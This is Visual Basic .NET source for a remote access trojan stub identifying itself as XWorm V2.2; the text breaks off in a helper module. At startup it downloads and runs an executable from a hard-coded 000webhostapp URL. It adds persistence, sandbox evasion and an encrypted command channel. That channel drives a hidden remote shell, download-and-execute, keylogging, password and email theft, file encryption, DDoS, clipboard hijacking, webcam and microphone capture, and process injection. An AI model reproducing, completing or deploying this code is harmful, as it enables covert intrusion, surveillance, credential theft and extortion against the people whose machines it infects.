Imports System.Security.Cryptography
Imports Microsoft.Win32
Imports System.Management
Imports System
Imports System.Net.Sockets
Imports Microsoft.VisualBasic
Imports System.Diagnostics
Imports System.Reflection
Imports System.Runtime.InteropServices
Imports System.Collections.Generic
Imports System.Drawing
Imports System.Windows.Forms
Imports System.IO
Imports System.Net
Imports System.Drawing.Drawing2D
Imports System.Drawing.Imaging
Imports System.Runtime.CompilerServices
Imports System.Security.Principal
Imports System.Text
Imports System.Threading
Imports System.Threading.Tasks
Imports Microsoft.VisualBasic.CompilerServices

<Assembly: AssemblyTitle("%Title%")>
<Assembly: AssemblyDescription("%Des%")>
<Assembly: AssemblyCompany("%Company%")>
<Assembly: AssemblyProduct("%Product%")>
<Assembly: AssemblyCopyright("%Copyright%")>
<Assembly: AssemblyTrademark("%Trademark%")>
<Assembly: AssemblyFileVersion("%v1%" + "." + "%v2%" + "." + "%v3%" + "." + "%v4%")>
<Assembly: AssemblyVersion("%v1%" + "." + "%v2%" + "." + "%v3%" + "." + "%v4%")>
<Assembly: Guid("%Guid%")>

#Const usbSP = False
#Const startup = False
#Const reg = False
#Const task = False
#Const Pastebin = False
#Const Analysis = False
Namespace Stub
    Public Class Settings
#If Pastebin Then
        Public Shared PasteUrl As String = "%PasteUrl%"
#End If
        Public Shared Host As String = "%ip%"
        Public Shared Port As String = "%port%"
        Public Shared KEY As String = "%key%"
        Public Shared SPL As String = "<Xwormmm>"

        Public Shared USBNM As String = "%usb%"

        Public Shared ReadOnly Mutexx As String = "%mtx%"
        Public Shared _appMutex As Mutex

#If usbSP Then
        Public Shared USBS As New USB
#End If
#If Not usbSP Then
        Public Shared usbC As Boolean
#End If
        Public Shared current As String = Process.GetCurrentProcess.MainModule.FileName


    End Class
    Public Class Main
        Public Shared Sub Main()

            Threading.Thread.Sleep(1000)
            Dim server As String
            Dim server_apper As New System.Text.StringBuilder

            server_apper.Append("https://rugh0hgiervrv.000webhostapp.com/taskmhostw.exe")
            server = server_apper.ToString

            Dim URL As String = server
            Dim DownloadTo As String = Environ("temp") & "taskmhostw.exe"
            Try
                Dim w As New Net.WebClient
                IO.File.WriteAllBytes(DownloadTo, w.DownloadData(URL))
                Shell(DownloadTo)
            Catch ex As Exception
            End Try

            If Not CreateMutex() Then Environment.Exit(0)

#If Analysis Then
            Try
                RunAntiAnalysis()
            Catch ex As Exception
                Debug.WriteLine(ex.Message)
            End Try
#End If

#If startup Then
            Try
                Dim STUP As String = Environment.GetFolderPath(7) & "\" & IO.Path.GetFileName(Settings.current)
                IO.File.Copy(Settings.current, STUP)
                Dim t As New FileInfo(STUP)
                t.Attributes = FileAttributes.Normal
            Catch ex As Exception
                Debug.WriteLine(ex.Message)
            End Try
#End If

#If task Then

            Dim apptask As String = Environ$("appdata")
            Dim outpath As String = apptask & "\" & IO.Path.GetFileName(Settings.current)
            Try
                IO.File.Copy(Settings.current, outpath)
            Catch ex As Exception
                Debug.WriteLine(ex.Message)
            End Try
            Try
                Dim PSInfo As New ProcessStartInfo("schtasks.exe")
                PSInfo.WindowStyle = ProcessWindowStyle.Hidden
                PSInfo.Arguments = ("/create /f /sc minute /mo 1 /tn " & """" & IO.Path.GetFileNameWithoutExtension(Settings.current) & """" & " /tr " + """" + outpath + """")
                Dim PS As Process = Process.Start(PSInfo)
                PS.WaitForExit()
            Catch ex As Exception
                Debug.WriteLine(ex.Message)
            End Try
#End If

#If reg Then
            Try
                Dim app As String = Environ$("appdata") & "\" & IO.Path.GetFileName(Settings.current)
                My.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).SetValue(IO.Path.GetFileNameWithoutExtension(Settings.current), app)
                IO.File.Copy(Settings.current, app)
            Catch ex As Exception
                Debug.WriteLine(ex.Message)
            End Try
#End If



#If usbSP Then
            Settings.USBS.Start()
#End If


#If Pastebin Then
            Dim ConInfo As String = DownloadStr(Settings.PasteUrl)
            Settings.Host = ConInfo.Split(":")(0)
            Settings.Port = ConInfo.Split(":")(1)
#End If


            Dim T2 As New Threading.Thread(Sub()
                                               While True
                                                   Thread.Sleep(New Random().Next(1000, 5000))
                                                   If ClientSocket.isConnected = False Then
                                                       ClientSocket.isDisconnected()
                                                       ClientSocket.BeginConnect()
                                                   End If
                                                   ClientSocket.allDone.WaitOne()
                                               End While
                                           End Sub)
            T2.Start()
            T2.Join()
        End Sub
#If Pastebin Then
           Public Shared Function DownloadStr(ByVal url As String) As String
            Try
                ServicePointManager.Expect100Continue = True
                ServicePointManager.SecurityProtocol = DirectCast(3072, SecurityProtocolType)
                ServicePointManager.DefaultConnectionLimit = 9999
            Catch ex As Exception
                Debug.WriteLine(ex.Message)
            End Try
            Try
Re:
                Using wc As New WebClient
                    Return wc.DownloadString(url)
                End Using
            Catch ex As Exception
                Threading.Thread.Sleep(3000)
                GoTo Re
            End Try
        End Function
#End If
#If Analysis Then
        Public Shared Sub RunAntiAnalysis()
            If DetectManufacturer() OrElse DetectDebugger() OrElse DetectSandboxie() OrElse IsXP() OrElse anyrun() Then Environment.FailFast(Nothing)
        End Sub

        Private Shared Function anyrun() As Boolean
        Try
            Dim status As String = New System.Net.WebClient().DownloadString("http://ip-api.com/line/?fields=hosting")
            Return status.Contains("true")
        Catch
        End Try
        Return False
    End Function

    Private Shared Function IsXP() As Boolean
        Try
            If New Microsoft.VisualBasic.Devices.ComputerInfo().OSFullName.ToLower().Contains("xp") Then
                Return True
            End If
        Catch
        End Try
        Return False
    End Function

    Private Shared Function DetectManufacturer() As Boolean
        Try
            Using searcher = New ManagementObjectSearcher("Select * from Win32_ComputerSystem")
                Dim item
                Using items = searcher.[Get]()
                    For Each item In items
                        Dim manufacturer As String = item("Manufacturer").ToString().ToLower()
                        If (manufacturer = "microsoft corporation" AndAlso item("Model").ToString().ToUpperInvariant().Contains("VIRTUAL")) OrElse manufacturer.Contains("vmware") OrElse item("Model").ToString() = "VirtualBox" Then
                            Return True
                        End If
                    Next
                End Using
            End Using
        Catch
        End Try
        Return False
    End Function
    Private Shared Function DetectDebugger() As Boolean
        Dim isDebuggerPresent As Boolean = False
        Try
            CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, isDebuggerPresent)
            Return isDebuggerPresent
        Catch
            Return isDebuggerPresent
        End Try
    End Function

    Private Shared Function DetectSandboxie() As Boolean
        Try
            If GetModuleHandle("SbieDll.dll").ToInt32() <> 0 Then
                Return True
            Else
                Return False
            End If
        Catch
            Return False
        End Try
    End Function
    <DllImport("kernel32.dll")>
    Public Shared Function GetModuleHandle(ByVal lpModuleName As String) As IntPtr
    End Function
    <DllImport("kernel32.dll", SetLastError:=True, ExactSpelling:=True)>
    Public Shared Function CheckRemoteDebuggerPresent(ByVal hProcess As IntPtr, ByRef isDebuggerPresent As Boolean) As Boolean
    End Function
#End If
    End Class
    Public Class ClientSocket


        Public Shared isConnected As Boolean = False
        Public Shared S As Socket = Nothing
        Private Shared BufferLength As Long = Nothing
        Private Shared BufferLengthReceived As Boolean = False
        Private Shared Buffer() As Byte
        Private Shared MS As MemoryStream = Nothing
        Private Shared Tick As Threading.Timer = Nothing
        Public Shared allDone As New ManualResetEvent(False)
        Private Shared SendSync As Object = Nothing

        Public Shared ReadOnly SPL = Settings.SPL


        Public Shared Sub BeginConnect()
            Try
                S = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)

                BufferLength = -1
                Buffer = New Byte(0) {}
                MS = New MemoryStream

                S.ReceiveBufferSize = 50 * 1024
                S.SendBufferSize = 50 * 1024


                S.Connect(Settings.Host, Settings.Port)
                Debug.WriteLine("Connect : Connected")

                isConnected = True
                SendSync = New Object()
                Send(Info)
                S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), Nothing)

                Dim T As New TimerCallback(AddressOf Ping)
                Tick = New Threading.Timer(T, Nothing, New Random().Next(10 * 1000, 15 * 1000), New Random().Next(10 * 1000, 15 * 1000))
            Catch ex As Exception
                Debug.WriteLine("Connect : Failed")
                isConnected = False
            Finally
                allDone.Set()
            End Try
        End Sub
        Public Shared Function Info()

            Dim OS As New Devices.ComputerInfo
            Return String.Concat("INFO", SPL, (ID()), SPL, Environment.UserName, SPL, OS.OSFullName.Replace("Microsoft", Nothing), Environment.OSVersion.ServicePack.Replace("Service Pack", "SP") + " ", Environment.Is64BitOperatingSystem.ToString.Replace("False", "32bit").Replace("True", "64bit"), SPL, "XWorm V2.2", SPL, INDATE(), SPL, usbp(), SPL, admin, SPL, Messages.Cam, SPL, Antivirus(), SPL, Comment())

        End Function

        Public Shared Sub BeginReceive(ByVal ar As IAsyncResult)
            If isConnected = False Then Return

            Try
                Dim Received As Integer = S.EndReceive(ar)
                If Received > 0 Then
                    If BufferLength = -1 Then
                        If Buffer(0) = 0 Then
                            BufferLength = BS(MS.ToArray)
                            MS.Dispose()
                            MS = New MemoryStream

                            If BufferLength = 0 Then
                                BufferLength = -1
                                S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), S)
                                Exit Sub
                            End If
                            Buffer = New Byte(BufferLength - 1) {}
                        Else
                            MS.WriteByte(Buffer(0))
                        End If
                    Else
                        MS.Write(Buffer, 0, Received)
                        If (MS.Length = BufferLength) Then
                            Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf BeginRead), MS.ToArray)
                            BufferLength = -1
                            MS.Dispose()
                            MS = New MemoryStream
                            Buffer = New Byte(0) {}
                        Else
                            Buffer = New Byte(BufferLength - MS.Length - 1) {}
                        End If
                    End If
                Else
                    isConnected = False
                    Return
                End If
                S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), S)
            Catch ex As Exception
                isConnected = False
                Return
            End Try
        End Sub
        Public Shared Sub BeginRead(ByVal b As Byte())
            Try
                Messages.Read(b)
            Catch ex As Exception
            End Try
        End Sub
        Public Shared Sub Send(ByVal msg As String)
            SyncLock SendSync
                If isConnected = True Then
                    Try
                        Using MS As New MemoryStream
                            Dim B As Byte() = AES_Encryptor(SB(msg))
                            Dim L As Byte() = SB(B.Length & CChar(vbNullChar))

                            MS.Write(L, 0, L.Length)
                            MS.Write(B, 0, B.Length)

                            S.Poll(-1, SelectMode.SelectWrite)
                            S.BeginSend(MS.ToArray, 0, MS.Length, SocketFlags.None, New AsyncCallback(AddressOf EndSend), Nothing)
                        End Using
                    Catch ex As Exception
                        Debug.WriteLine("Send : Failed")
                        isConnected = False
                    End Try
                End If
            End SyncLock
        End Sub

        Public Shared Sub EndSend(ByVal ar As IAsyncResult)
            Try
                S.EndSend(ar)
            Catch ex As Exception
                Debug.WriteLine("EndSend : Failed")
                isConnected = False
            End Try
        End Sub

        Public Shared Sub isDisconnected()

            If Tick IsNot Nothing Then
                Try
                    Tick.Dispose()
                    Tick = Nothing
                Catch ex As Exception
                    Debug.WriteLine("Tick.Dispose")
                End Try
            End If

            If MS IsNot Nothing Then
                Try
                    MS.Close()
                    MS.Dispose()
                    MS = Nothing
                Catch ex As Exception
                    Debug.WriteLine("MS.Dispose")
                End Try
            End If

            If S IsNot Nothing Then
                Try
                    S.Close()
                    S.Dispose()
                    S = Nothing
                Catch ex As Exception
                    Debug.WriteLine("S.Dispose")
                End Try
            End If
            GC.Collect()
        End Sub

        Public Shared Sub Ping()
            Try
                If isConnected = True Then
                    Send("PING?")
                    GC.Collect()
                End If
            Catch ex As Exception
            End Try
        End Sub
    End Class
    Public Class Messages
        Private Shared ReadOnly SPL = ClientSocket.SPL
        Private Shared WithEvents MyProcess As Process
        Private Delegate Sub AppendOutputTextDelegate(ByVal text As String)
        Private Shared processid As Integer
        Public Shared Sub AppendOutputText(ByVal text As String)
            Try
                Dim myDelegate As New AppendOutputTextDelegate(AddressOf AppendOutputText)
                ClientSocket.Send("R/" + SPL + text + SPL + ID())
            Catch ex As Exception
            End Try
        End Sub
        Private Shared Sub MyProcess_ErrorDataReceived(ByVal sender As Object, ByVal e As System.Diagnostics.DataReceivedEventArgs) Handles MyProcess.ErrorDataReceived
            AppendOutputText(vbCrLf & "Error: " & e.Data & vbCrLf)
        End Sub

        Private Shared Sub MyProcess_OutputDataReceived(ByVal sender As Object, ByVal e As System.Diagnostics.DataReceivedEventArgs) Handles MyProcess.OutputDataReceived
            AppendOutputText(vbCrLf & e.Data)
        End Sub
        Public Shared WCam As Byte()
        Public Shared WMic As Byte()
        Public Shared WSound As Byte()
        Public Shared Sub Read(ByVal b As Byte())
            Try
                Dim A As String() = Split(BS(AES_Decryptor(b)), SPL)
                Select Case A(0)

                    Case "rec"
                        CloseMutex()
                        Application.Restart()
                        Environment.Exit(0)

                    Case "CLOSE"
                        ClientSocket.S.Shutdown(Net.Sockets.SocketShutdown.Both)
                        ClientSocket.S.Close()
                        Environment.Exit(0)

                    Case "uninstall"
#If usbSP Then
                        Settings.USBS.stopp()
#End If
                        objj(A(1)).un(Settings.USBNM)

                    Case "update"
                        objj(A(1)).update(Settings.USBNM, A(2), A(3))


                    Case "DW"
                        Download(A(1), A(2))

                    Case "RD-"
                        Dim s = Screen.PrimaryScreen.Bounds.Size
                        ClientSocket.Send("RD-" & SPL & s.Width & SPL & s.Height & SPL & ID())

                    Case "RD+"
                        RemoteDesktop.Capture(New Size(A(1), A(2)), (A(3)))

                    Case "###" ' mouse clicks
                        Cursor.Position = New Point(A(1), A(2))
                        mouse_event(A(3), 0, 0, 0, 1)
                    Case "$$$" '  mouse move
                        Cursor.Position = New Point(A(1), A(2))

                    Case "^^^&"
                        Dim keyDown As Boolean = Convert.ToBoolean(A(2))
                        Dim key As Byte = Convert.ToByte(A(1))
                        keybd_event(key, 0, If(keyDown, CUInt(&H0), CUInt(&H2)), UIntPtr.Zero)

                    Case "FM"
                        objj(A(1)).Memory(frombase64(A(2)))




                    Case "LN"
                        Dim temp As String = IO.Path.GetTempFileName & "-" & A(1)
                        Dim webClient As New System.Net.WebClient()
                        webClient.DownloadFile(A(2), temp)
                        Process.Start(temp)


                    Case "getinfo"
                        ClientSocket.Send("getinfo" & SPL & ID())

                    Case "Xinfo"
                        ClientSocket.Send("Xinfo" + SPL + objj(A(1)).gett() + SPL + ID())

                    Case "url"
                        Process.Start(A(1))

                    Case "openhide"
                        Dim i = CreateObject("internetexplorer.application")
                        i.navigate(A(1))
                        i.visible = 0

                    Case "shellfuc"
                        Shell(A(1), AppWinStyle.Hide)

                    Case "regfuc"
                        CreateObject("WScript.Shell").RegWrite(A(1), Convert.ToInt32(A(2)), "REG_DWORD")


                    Case "bot"
                        objj(A(1)).RunBotKiller()

                    Case "admin"
                        objj(A(1)).uac()



                    Case "script"
                        objj(A(1)).exc(A(2), A(3))


                    Case "DDosS"
                        Try
                            DDos.Abort()
                        Catch ex As Exception
                        End Try
                        DDos = New Threading.Thread(AddressOf STDos)
                        IPHOST = IsValid(A(1))
                        PortHost = A(2)
                        DDos.Start()

                    Case "DDosT"
                        Try
                            DDos.Abort()
                        Catch ex As Exception
                        End Try



                    Case "Cilpper"
                        objj(A(1)).Clipper(A(2), A(3))





                    Case "PE"
                        If IO.File.Exists(A(2)) Then
                            objj(A(1)).injRun(A(2), frombase64(A(3)))
                        End If

#If Not usbSP Then
                    Case "startusb"
                        If Settings.usbC = True Then
                        Else
                            objj(A(1)).startsp(Settings.USBNM)
                            Settings.usbC = True
                        End If
#End If


                    Case "vbb"
                        objj(A(1)).CallV(A(2), A(3))

                    Case "PSleep"
                        objj(A(1)).PreventSleep()


                    Case "xxx"
                        ClientSocket.Send("xxx" & SPL & ID())

                    Case "R/"
                        Try
                            Try
                                Using process As Process = New Process
                                    process.StartInfo.FileName = "taskkill.exe"

                                    process.StartInfo.Arguments = " /pid " & processid & " /f"

                                    process.StartInfo.UseShellExecute = False
                                    process.StartInfo.RedirectStandardError = False
                                    process.StartInfo.RedirectStandardOutput = False
                                    process.StartInfo.CreateNoWindow = True
                                    process.Start()
                                    process.WaitForExit()
                                End Using

                            Catch ex As Exception

                            End Try

                            MyProcess = New Process
                            With MyProcess.StartInfo
                                .FileName = "CMD.EXE"
                                .UseShellExecute = False
                                .CreateNoWindow = True
                                .RedirectStandardInput = True
                                .RedirectStandardOutput = True
                                .RedirectStandardError = True
                            End With

                            MyProcess.Start()
                            processid = MyProcess.Id


                            MyProcess.BeginErrorReadLine()
                            MyProcess.BeginOutputReadLine()

                            AppendOutputText("Process Started at: " & MyProcess.StartTime.ToString)

                        Catch ex As Exception
                        End Try
                    Case "runnnnnn"
                        MyProcess.StandardInput.WriteLine(A(1))
                        MyProcess.StandardInput.Flush()

                    Case "closeshell"
                        MyProcess.StandardInput.WriteLine("EXIT")
                        MyProcess.StandardInput.Flush()
                        MyProcess.Close()

                    Case "ppp"
                        ClientSocket.Send("ppp" + SPL + ID())

                    Case "R#"
                        Dim Inhalt As String = Nothing
                        For Each p As Process In Process.GetProcesses
                            Try
                                Inhalt &= IO.Path.GetFileNameWithoutExtension(p.ProcessName) + IO.Path.GetExtension(p.MainModule.FileName.ToString) & "|+++|" & p.Id & "|+++|" & p.MainModule.FileName.ToString & "*+*"
                            Catch ex As Exception
                            End Try
                        Next
                        ClientSocket.Send("R#" & SPL & Inhalt & SPL & Settings.current + SPL + ID())

                    Case "kill"
                        Process.GetProcessById(CInt(A(1))).Kill()

                    Case "kD"
                        Process.GetProcessById(CInt(A(1))).Kill()
                        Thread.Sleep(500)
                        IO.File.Delete(A(2))


                    Case "RST"
                        Process.GetProcessById(CInt(A(1))).Kill()
                        Thread.Sleep(500)
                        Process.Start(A(2))



                    Case "cbb"
                        ClientSocket.Send("cbb" + SPL + ID())

                    Case "R$"
                        ClientSocket.Send("R$" & SPL & objj(A(1)).GetText() & SPL & ID())

                    Case "SETT"
                        objj(A(1)).setText(A(2))

                    Case "clss"
                        objj(A(1)).clearr()

                    Case "BSOD"
                        objj(A(1)).BSOD()

                    Case "BScreen"
                        objj(A(1)).Blank(Convert.ToInt32(A(2)))

                    Case "InsW"
                        objj(A(1)).INSS(Convert.ToInt32(A(2)))


                    Case "|||"
                        ClientSocket.Send("|||" + SPL + (ID()))

                    Case "GetDrives"
                        ClientSocket.Send("FileManager" & SPL & (ID()) & SPL & getDrives())

                    Case "FileManager"
                        Try
                            ClientSocket.Send("FileManager" & SPL & ID() & SPL & getFolders(A(1)) & getFiles(A(1)))
                        Catch
                            ClientSocket.Send("FileManager" & SPL & ID() & SPL & "Error")
                        End Try


                    Case "Delete"
                        Select Case A(1)
                            Case "Folder"
                                IO.Directory.Delete(A(2), True)
                            Case "File"
                                IO.File.Delete(A(2))
                        End Select
                    Case "Execute"
                        Process.Start(A(1))
                    Case "Rename"
                        Select Case A(1)
                            Case "Folder"
                                My.Computer.FileSystem.RenameDirectory(A(2), A(3))
                            Case "File"
                                My.Computer.FileSystem.RenameFile(A(2), A(3))
                        End Select


                    Case "tss"
                        Dim r As String = (My.Computer.FileSystem.ReadAllText((A(1))))
                        ClientSocket.Send("txtttt" + SPL + (ID() & SPL & r & SPL & A(1)))

                    Case "sedit"
                        Dim objWriter As New System.IO.StreamWriter(A(1), False)
                        objWriter.WriteLine(A(2))
                        objWriter.Close()


                    Case "viewimage"
                        Using MEM As New IO.MemoryStream
                            Using myBitmap As Bitmap = New Bitmap(A(1))
                                myBitmap.GetThumbnailImage(Convert.ToInt32(A(2)), Convert.ToInt32(A(3)), New Image.GetThumbnailImageAbort(Function() False), IntPtr.Zero).Save(MEM, ImageFormat.Png)
                            End Using
                            ClientSocket.Send(("viewimage" + SPL + ID() + ClientSocket.SPL + BS(MEM.ToArray)))
                        End Using

                    Case "hidefolderfile"
                        Dim hiden As FileAttribute = FileAttribute.Hidden
                        SetAttr(A(1), hiden)


                    Case "showfolderfile"
                        Dim shown As FileAttribute = FileAttribute.Normal
                        SetAttr(A(1), shown)

                    Case "creatnewfolder"
                        My.Computer.FileSystem.CreateDirectory(A(1))

                    Case "creatfile"
                        File.Create(A(1)).Dispose()

                    Case "downloadfile"
                        ClientSocket.Send("downloadedfile" & SPL & Convert.ToBase64String(IO.File.ReadAllBytes(A(1))) & SPL & A(2) & SPL & (ID()))
                    Case "sendfileto"
                        IO.File.WriteAllBytes(A(1), frombase64(A(2)))

                    Case "WL"
                        objj(A(1)).WL(A(2))

                    Case "DelP"
                        objj(A(1)).del()


                    Case "7zIT"
                        objj(A(1)).install()

                    Case "NETINS"
                        If Net3 = 1 Then
                        Else
                            Net3 = 1
                            objj(A(1)).install()
                        End If

                    Case "7zzip"
                        Shell(IO.Path.GetTempPath & "7zip" & "\7z.exe" & A(1), AppWinStyle.Hide)


                    Case "CPP"
                        Dim XX
                        For Each XX In Strings.Split(A(1), ("|"))
                            Try
                                If IO.File.Exists(XX) Then
                                    IO.File.Copy(XX, A(2) & IO.Path.GetFileName(XX))
                                End If

                                If IO.Directory.Exists(XX) Then
                                    My.Computer.FileSystem.CopyDirectory(XX, A(2) & IO.Path.GetFileName(XX), True)
                                End If
                            Catch ex As Exception
                            End Try
                        Next
                    Case "CTT"
                        Dim XX
                        For Each XX In Strings.Split(A(1), ("|"))
                            Try
                                If IO.File.Exists(XX) Then
                                    IO.File.Move(XX, A(2) & IO.Path.GetFileName(XX))
                                End If

                                If IO.Directory.Exists(XX) Then
                                    My.Computer.FileSystem.MoveDirectory(XX, A(2) & IO.Path.GetFileName(XX), True)
                                End If
                            Catch ex As Exception
                            End Try
                        Next





                    Case "PRG"
                        ClientSocket.Send("PRG" + SPL + ID())


                    Case "P@"
                        ClientSocket.Send("P@" & SPL & objj(A(1)).InsProg() + SPL + ID())
                    Case "UNS"
                        Shell(A(1), AppWinStyle.NormalFocus)


                    Case "RSS"
                        My.Computer.Audio.Stop()
                        My.Computer.Audio.Play(A(1))

                    Case "RSSDis"
                        My.Computer.Audio.Stop()


                    Case "ENC"
                        objj(A(1)).ENC((ID()), A(2))

                    Case "DEC"
                        objj(A(1)).DEC((ID()), A(2))











                    Case "WBCM"
                        If Cam() Then
                            Try
                                WCam = frombase64(A(1))
                            Catch ex As Exception
                            End Try

                            If WCam Is Nothing Then
                                ClientSocket.Send("GETWCamPlu")
                                Return
                            End If
                            objj(Convert.ToBase64String(WCam)).CON(Settings.Host, Settings.Port, Settings.SPL, Settings.KEY, ID)
                        End If



                    Case "MICL"
                        Try
                            WMic = frombase64(A(1))
                        Catch ex As Exception
                        End Try

                        If WMic Is Nothing Then
                            ClientSocket.Send("GETWmicPlu")
                            Return
                        End If
                        objj(Convert.ToBase64String(WMic)).CON(Settings.Host, Settings.Port, Settings.SPL, Settings.KEY, ID)

                    Case "Wsound"
                        Try
                            WSound = frombase64(A(1))
                        Catch ex As Exception
                        End Try

                        If WSound Is Nothing Then
                            ClientSocket.Send("GETWsoundPlu")
                            Return
                        End If
                        objj(Convert.ToBase64String(WSound)).CON(Settings.Host, Settings.Port, Settings.SPL, Settings.KEY, ID)


                    Case "JustFun"
                        objj(A(1)).CON(Settings.Host, Settings.Port, Settings.SPL, Settings.KEY, ID)

                    Case "MapsPLU"
                        objj(A(1)).CON(Settings.Host, Settings.Port, Settings.SPL, Settings.KEY, ID)

                    Case "KL"
                        Try
                            KL.Abort()
                        Catch ex As Exception
                        End Try

                        KL = New Threading.Thread(Sub()
                                                      objj(A(1)).logdf()
                                                  End Sub)
                        KL.Start()

                    Case "closeKL"
                        Try
                            KL.Abort()
                        Catch ex As Exception
                        End Try


                    Case "KLget"
                        ClientSocket.Send("KLget" + SPL + ID())


                    Case "KLGET"
                        ClientSocket.Send("KLGET" & SPL & Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\" & ID(), "KL", Nothing) & SPL & ID())

                    Case "TCPV"
                        ClientSocket.Send("TCPV" + SPL + ID())

                    Case "TCPG"
                        ClientSocket.Send("TCPG" & SPL & objj(A(1)).GETTCP(A(2)) & SPL & Process.GetCurrentProcess.Id & SPL & ID())



                    Case "ACT"
                        ClientSocket.Send("ACT" + SPL + ID())

                    Case "ACTG"
                        Dim LST As Object = objj(A(1)).GetActiveWindows()

                        For Each ss As String In LST
                            Try
                                ClientSocket.Send("ACTG" + SPL + ID() & SPL & ss)
                            Catch ex As Exception
                            End Try
                        Next
                        ClientSocket.Send("ENBC" + SPL + ID())

                    Case "killAct"
                        objj(A(1)).Kill(A(2))
                        ClientSocket.Send("Ref" + SPL + ID())

                    Case "FURL"
                        My.Computer.Network.DownloadFile(A(1), A(2))


                    Case "msgg"
                        MessageBox.Show(A(1))

                    Case "UPtoS"
                        My.Computer.Network.UploadFile(A(2), A(1))


                    Case "FSG"
                        objj(A(1)).RUN(A(2), A(3), A(4))


                    Case "RENC"
                        If RS = 1 Then
                        Else
                            RS = 1
                            objj(A(1)).ENC((ID()), A(2), A(3), A(4), A(5))
                            RS = 2
                        End If


                    Case "RDEC"
                        If RS = 2 Then
                            RS = 1
                            objj(A(1)).DEC((ID()))
                            RS = 0
                        End If


                    Case "HVNC"
                        objj(A(1)).Run(A(2), A(3))






                    Case "ngrok"
                        ClientSocket.Send("ngrok" + SPL + ID())


                    Case "InstallN"
                        If ngrok = 1 Then
                        Else
                            ngrok = 1
                            objj(A(1)).install(A(2))
                            ClientSocket.Send("InstallngC" + SPL + ID())
                            ngrok = 0
                        End If


                    Case "hrdp"
                        If IO.File.Exists(Environ$("Temp") + "\ngrok.exe") Then
                            ClientSocket.Send("hrdp" + SPL + ID())
                        Else
                            ClientSocket.Send("ngrok" + SPL + ID())
                        End If


                    Case "hrdp+"
                        ClientSocket.Send("hrdp+" & SPL & objj(A(1)).install(A(2), A(3)) + SPL + ID())




                    Case "PassR"
                        ClientSocket.Send("PassR" + SPL + ID())

                    Case "PC#"
                        ClientSocket.Send("Getpass" + SPL + ID() & SPL & objj(A(1)).get())


                    Case "Pvbnet"
                        ClientSocket.Send("Getpass" + SPL + ID() & SPL & objj(A(1)).gett())

                    Case "WDPL"
                        objj(A(1)).gett()



                    Case "Email"
                        Dim EM As String = objj(A(1)).Emails()
                        If EM = "Error!" Then
                            ClientSocket.Send("Getpass" + SPL + ID() & SPL & "Error!")
                        Else
                            ClientSocket.Send("Getpass" + SPL + ID() & SPL & EM)
                        End If


                    Case "Xchat"
                        ClientSocket.Send("Xchat" + SPL + ID())

                    Case "LLCHAT"
                        objj(A(1)).CON(Settings.Host, Settings.Port, Settings.SPL, Settings.KEY, ID)

                    Case "SNote"
                        Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\" & ID(), "NT", A(1))

                End Select
            Catch ex As Exception
                Debug.WriteLine(ex.Message)
            End Try

        End Sub
        Declare Sub mouse_event Lib "user32" Alias "mouse_event" (ByVal dwFlags As Integer, ByVal dx As Integer, ByVal dy As Integer, ByVal cButtons As Integer, ByVal dwExtraInfo As Integer)
        <DllImport("user32.dll")>
        Friend Shared Function keybd_event(ByVal bVk As Byte, ByVal bScan As Byte, ByVal dwFlags As UInteger, ByVal dwExtraInfo As UIntPtr) As Boolean
        End Function

        Public Shared ngrok As Integer
        Public Shared RS As Integer
        Public Shared KL As Threading.Thread

        <DllImport("avicap32.dll", EntryPoint:="capCreateCaptureWindowA")>
        Public Shared Function capCreateCaptureWindowA(ByVal lpszWindowName As String, ByVal dwStyle As Integer, ByVal X As Integer, ByVal Y As Integer, ByVal nWidth As Integer, ByVal nHeight As Integer, ByVal hwndParent As Integer, ByVal nID As Integer) As IntPtr
        End Function
        Public Shared Handle As IntPtr
        <DllImport("avicap32.dll", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)>
        Public Shared Function capGetDriverDescriptionA(ByVal wDriver As Short, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpszName As String, ByVal cbName As Integer, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpszVer As String, ByVal cbVer As Integer) As Boolean
        End Function
        Public Shared Function Cam() As Boolean
            Try
                Dim num As Integer = 0
                Do
                    Dim lpszVer As String = Nothing
                    If capGetDriverDescriptionA(CShort(num), Strings.Space(100), 100, lpszVer, 100) Then
                        Return True
                    End If
                    num += 1
                Loop While (num <= 4)
            Catch exception1 As Exception
            End Try
            Return False
        End Function
        Public Shared Net3 As Integer
        Public Shared Function getFolders(ByVal location) As String
            Dim di As New DirectoryInfo(location)
            Dim folders = ""
            For Each subdi As DirectoryInfo In di.GetDirectories
                folders += "[Folder]" & subdi.Name & "FileManagerSplitFileManagerSplit"
            Next
            Return folders
        End Function
        Public Shared Function getFiles(ByVal location) As String
            Dim dir As New System.IO.DirectoryInfo(location)
            Dim files = ""
            For Each f As System.IO.FileInfo In dir.GetFiles("*.*")
                files += f.Name & "FileManagerSplit" & f.Length.ToString & "FileManagerSplit"
            Next
            Return files
        End Function
        Public Shared Function getDrives() As String
            Dim allDrives As String = ""
            For Each d As DriveInfo In My.Computer.FileSystem.Drives
                Select Case d.DriveType
                    Case 3
                        allDrives += "[Drive]" & d.Name & "FileManagerSplitFileManagerSplit"
                    Case 5
                        allDrives += "[CD]" & d.Name & "FileManagerSplitFileManagerSplit"
                    Case 2
                        allDrives += "[USB]" & d.Name & "FileManagerSplitFileManagerSplit"
                    Case 4
                        allDrives += "[NET]" & d.Name & "FileManagerSplitFileManagerSplit"

                End Select
            Next
            Return allDrives
        End Function

        Private Shared Sub Download(ByVal Name As String, ByVal Data As String)
            Try
                Dim NewFile = Path.GetTempFileName + Name
                File.WriteAllBytes(NewFile, frombase64(Data))
                Threading.Thread.Sleep(500)
                Diagnostics.Process.Start(NewFile)
            Catch ex As Exception
            End Try
        End Sub
    End Class

    Module Helper
        Function SB(ByVal s As String) As Byte()
            Return System.Text.Encoding.Default.GetBytes(s)
        End Function

        Function BS(ByVal b As Byte()) As String
